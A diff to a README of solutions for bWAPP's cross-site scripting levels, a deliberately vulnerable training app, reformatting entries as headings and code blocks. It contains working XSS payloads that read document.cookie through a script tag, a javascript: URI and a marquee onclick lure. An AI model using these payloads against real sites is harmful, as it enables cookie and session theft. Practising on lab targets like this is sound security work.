@@ -50,8 +50,8 @@ Welcome to the repository of comprehensive solutions for bWAPP's Cross-Site Scri
 ```Payload – Same as medium```
 ```Javascript:alert(document.cookie)```
 
-XSS - Reflected (CustomHeader)(Low)
-Payload- bWAPP:<script>alert(document.cookie)</script>
+# XSS - Reflected (CustomHeader)(Low)
+```Payload- bWAPP:<script>alert(document.cookie)</script>```
 
-XSS - Reflected (CustomHeader)(Medium)
-Payload – bWAPP:<marquee onclick=alert(document.cookie)>click to win 1$</marquee>
+# XSS - Reflected (CustomHeader)(Medium)
+```Payload – bWAPP:<marquee onclick=alert(document.cookie)>click to win 1$</marquee>```
